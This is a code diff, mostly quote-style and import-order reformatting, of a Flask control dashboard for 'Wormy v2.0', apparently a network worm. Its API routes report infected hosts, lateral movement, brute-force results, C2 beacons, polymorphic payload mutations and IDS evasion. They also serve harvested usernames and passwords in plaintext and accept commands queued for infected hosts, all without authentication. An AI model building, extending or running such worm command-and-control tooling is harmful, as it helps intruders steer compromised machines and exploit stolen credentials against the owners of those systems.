@@ -10,12 +10,12 @@ Professional Flask-based web interface with Chart.js graphs,
 real-time monitoring, and interactive controls
 """
 
+import json
+import logging
 import os
 import sys
-import json
-import time
-import logging
 import threading
+import time
 from datetime import datetime
 from typing import Dict, List, Optional
 
@@ -24,11 +24,12 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
 
 # ── Silence Flask/Werkzeug access logs (they pollute Rich Live TUI) ───────────
-logging.getLogger('werkzeug').setLevel(logging.ERROR)
-logging.getLogger('flask.app').setLevel(logging.ERROR)
+logging.getLogger("werkzeug").setLevel(logging.ERROR)
+logging.getLogger("flask.app").setLevel(logging.ERROR)
 
 try:
-    from flask import Flask, render_template_string, jsonify, request
+    from flask import Flask, jsonify, render_template_string, request
+
     FLASK_AVAILABLE = True
 except ImportError:
     FLASK_AVAILABLE = False
@@ -38,7 +39,7 @@ except ImportError:
 class WebDashboard:
     """
     Professional Web Dashboard for Wormy v2.0
-    
+
     Features:
     - Real-time host monitoring with Chart.js graphs
     - Network topology visualization
@@ -49,7 +50,7 @@ class WebDashboard:
     - Command execution interface
     """
 
-    def __init__(self, worm_core=None, host: str = '0.0.0.0', port: int = 5000):
+    def __init__(self, worm_core=None, host: str = "0.0.0.0", port: int = 5000):
         self.worm = worm_core
         self.host = host
         self.port = port
@@ -65,62 +66,62 @@ class WebDashboard:
         logger.info(f"Web Dashboard v2.0 initialized on {host}:{port}")
 
     def _setup_routes(self):
-        @self.app.route('/')
+        @self.app.route("/")
         def index():
             return render_template_string(self._get_dashboard_html())
 
-        @self.app.route('/api/status')
+        @self.app.route("/api/status")
         def api_status():
             return jsonify(self._get_status_data())
 
-        @self.app.route('/api/hosts')
+        @self.app.route("/api/hosts")
         def api_hosts():
             return jsonify(self._get_hosts_data())
 
-        @self.app.route('/api/activity')
+        @self.app.route("/api/activity")
         def api_activity():
-            limit = request.args.get('limit', 50, type=int)
+            limit = request.args.get("limit", 50, type=int)
             return jsonify(self._get_activity_data(limit))
 
-        @self.app.route('/api/vulnerabilities')
+        @self.app.route("/api/vulnerabilities")
         def api_vulnerabilities():
             return jsonify(self._get_vulnerabilities_data())
 
-        @self.app.route('/api/credentials')
+        @self.app.route("/api/credentials")
         def api_credentials():
             return jsonify(self._get_credentials_data())
 
-        @self.app.route('/api/topology')
+        @self.app.route("/api/topology")
         def api_topology():
             return jsonify(self._get_topology_data())
 
-        @self.app.route('/api/stats')
+        @self.app.route("/api/stats")
         def api_stats():
             return jsonify(self._get_stats_data())
 
-        @self.app.route('/api/command', methods=['POST'])
+        @self.app.route("/api/command", methods=["POST"])
         def api_command():
             data = request.json
-            host_ip = data.get('host_ip', '')
-            command = data.get('command', '')
-            return jsonify({'status': 'queued', 'host': host_ip, 'command': command})
+            host_ip = data.get("host_ip", "")
+            command = data.get("command", "")
+            return jsonify({"status": "queued", "host": host_ip, "command": command})
 
     def _get_status_data(self) -> Dict:
         if not self.worm:
-            return {'error': 'WormCore not available'}
+            return {"error": "WormCore not available"}
         return {
-            'running': self.worm.running,
-            'infected_hosts': len(self.worm.infected_hosts),
-            'failed_targets': len(self.worm.failed_targets),
-            'total_discovered': self.worm.stats.get('total_hosts_discovered', 0),
-            'vulnerabilities': self.worm.stats.get('vulnerabilities_found', 0),
-            'exploit_chains': self.worm.stats.get('exploit_chains_built', 0),
-            'lateral_movements': f"{self.worm.stats.get('lateral_success', 0)}/{self.worm.stats.get('lateral_movements', 0)}",
-            'brute_force': f"{self.worm.stats.get('brute_force_successes', 0)}/{self.worm.stats.get('brute_force_attempts', 0)}",
-            'credentials': self.worm.stats.get('credentials_discovered', 0),
-            'c2_beacons': self.worm.stats.get('c2_beacons', 0),
-            'polymorphic_mutations': self.worm.stats.get('polymorphic_mutations', 0),
-            'start_time': self.worm.start_time.isoformat() if self.worm.start_time else None,
+            "running": self.worm.running,
+            "infected_hosts": len(self.worm.infected_hosts),
+            "failed_targets": len(self.worm.failed_targets),
+            "total_discovered": self.worm.stats.get("total_hosts_discovered", 0),
+            "vulnerabilities": self.worm.stats.get("vulnerabilities_found", 0),
+            "exploit_chains": self.worm.stats.get("exploit_chains_built", 0),
+            "lateral_movements": f"{self.worm.stats.get('lateral_success', 0)}/{self.worm.stats.get('lateral_movements', 0)}",
+            "brute_force": f"{self.worm.stats.get('brute_force_successes', 0)}/{self.worm.stats.get('brute_force_attempts', 0)}",
+            "credentials": self.worm.stats.get("credentials_discovered", 0),
+            "c2_beacons": self.worm.stats.get("c2_beacons", 0),
+            "polymorphic_mutations": self.worm.stats.get("polymorphic_mutations", 0),
+            "start_time": self.worm.start_time.isoformat() if self.worm.start_time else None,
         }
 
     def _get_hosts_data(self) -> List[Dict]:
@@ -128,17 +129,23 @@ class WebDashboard:
             return []
         hosts = []
         for ip, host_state in self.worm.host_monitor.hosts.items():
-            hosts.append({
-                'ip': ip, 'os': host_state.os_guess, 'status': host_state.status,
-                'health': host_state.health_score, 'detection_risk': host_state.detection_risk,
-                'cpu': host_state.cpu_usage, 'memory': host_state.memory_usage,
-                'payload_variant': host_state.payload_variant,
-                'infected_at': host_state.infected_at.isoformat(),
-                'last_beacon': host_state.last_beacon.isoformat(),
-                'activities': len(host_state.activity_log),
-                'credentials_found': len(host_state.credentials_found),
-                'lateral_movements': len(host_state.lateral_movement_history),
-            })
+            hosts.append(
+                {
+                    "ip": ip,
+                    "os": host_state.os_guess,
+                    "status": host_state.status,
+                    "health": host_state.health_score,
+                    "detection_risk": host_state.detection_risk,
+                    "cpu": host_state.cpu_usage,
+                    "memory": host_state.memory_usage,
+                    "payload_variant": host_state.payload_variant,
+                    "infected_at": host_state.infected_at.isoformat(),
+                    "last_beacon": host_state.last_beacon.isoformat(),
+                    "activities": len(host_state.activity_log),
+                    "credentials_found": len(host_state.credentials_found),
+                    "lateral_movements": len(host_state.lateral_movement_history),
+                }
+            )
         return hosts
 
     def _get_activity_data(self, limit: int = 50) -> List[Dict]:
@@ -151,54 +158,68 @@ class WebDashboard:
         if not self.worm:
             return vulns
         for host in self.worm.scan_results:
-            for v in host.get('vulnerabilities', []):
-                vulns.append({
-                    'host': host['ip'], 'cve': v.get('cve', 'N/A'),
-                    'name': v.get('name', 'Unknown'), 'severity': v.get('severity', 'UNKNOWN'),
-                    'cvss': v.get('cvss', 0), 'description': v.get('description', ''),
-                })
+            for v in host.get("vulnerabilities", []):
+                vulns.append(
+                    {
+                        "host": host["ip"],
+                        "cve": v.get("cve", "N/A"),
+                        "name": v.get("name", "Unknown"),
+                        "severity": v.get("severity", "UNKNOWN"),
+                        "cvss": v.get("cvss", 0),
+                        "description": v.get("description", ""),
+                    }
+                )
         return vulns
 
     def _get_credentials_data(self) -> List[Dict]:
         if not self.worm or not self.worm.cred_manager:
             return []
         creds = self.worm.cred_manager.get_discovered_credentials()
-        return [{'username': u, 'password': p, 'source': 'discovered'} for u, p in creds]
+        return [{"username": u, "password": p, "source": "discovered"} for u, p in creds]
 
     def _get_topology_data(self) -> Dict:
         nodes, edges = [], []
         if not self.worm:
-            return {'nodes': [], 'edges': []}
+            return {"nodes": [], "edges": []}
         for host in self.worm.scan_results:
-            ip = host['ip']
+            ip = host["ip"]
             is_infected = ip in self.worm.infected_hosts
             is_failed = ip in self.worm.failed_targets
-            status = 'infected' if is_infected else ('failed' if is_failed else 'discovered')
-            nodes.append({
-                'id': ip, 'label': ip, 'status': status,
-                'os': host.get('os_guess', 'Unknown'), 'ports': host.get('open_ports', []),
-            })
+            status = "infected" if is_infected else ("failed" if is_failed else "discovered")
+            nodes.append(
+                {
+                    "id": ip,
+                    "label": ip,
+                    "status": status,
+                    "os": host.get("os_guess", "Unknown"),
+                    "ports": host.get("open_ports", []),
+                }
+            )
         if self.worm.host_monitor:
             for ip, host_state in self.worm.host_monitor.hosts.items():
                 for lm in host_state.lateral_movement_history:
-                    edges.append({
-                        'from': ip, 'to': lm.get('target', ''),
-                        'label': lm.get('technique', ''), 'success': lm.get('success', False),
-                    })
-        return {'nodes': nodes, 'edges': edges}
+                    edges.append(
+                        {
+                            "from": ip,
+                            "to": lm.get("target", ""),
+                            "label": lm.get("technique", ""),
+                            "success": lm.get("success", False),
+                        }
+                    )
+        return {"nodes": nodes, "edges": edges}
 
     def _get_stats_data(self) -> Dict:
         if not self.worm:
             return {}
         stats = {**self.worm.stats}
         if self.worm.start_time:
-            stats['start_time'] = self.worm.start_time.isoformat()
-        if self.worm.stats.get('end_time'):
-            stats['end_time'] = self.worm.stats['end_time'].isoformat()
+            stats["start_time"] = self.worm.start_time.isoformat()
+        if self.worm.stats.get("end_time"):
+            stats["end_time"] = self.worm.stats["end_time"].isoformat()
         if self.worm.host_monitor:
-            stats['host_monitor'] = self.worm.host_monitor.get_statistics()
+            stats["host_monitor"] = self.worm.host_monitor.get_statistics()
         if self.worm.ids_evasion:
-            stats['evasion'] = self.worm.ids_evasion.get_statistics()
+            stats["evasion"] = self.worm.ids_evasion.get_statistics()
         return stats
 
     def _get_dashboard_html(self) -> str:
@@ -447,13 +468,15 @@ class WebDashboard:
         if not FLASK_AVAILABLE:
             return
         import logging as _log
-        _log.getLogger('werkzeug').setLevel(_log.ERROR)
+
+        _log.getLogger("werkzeug").setLevel(_log.ERROR)
         logger.info(f"Starting Web Dashboard v2.0 on {self.host}:{self.port}")
         self.app.run(
-            host=self.host, port=self.port,
-            debug=False,           # never debug — it spawns a second process
+            host=self.host,
+            port=self.port,
+            debug=False,  # never debug — it spawns a second process
             threaded=True,
-            use_reloader=False,    # prevents double-start on Windows
+            use_reloader=False,  # prevents double-start on Windows
         )
 
     def run_background(self):
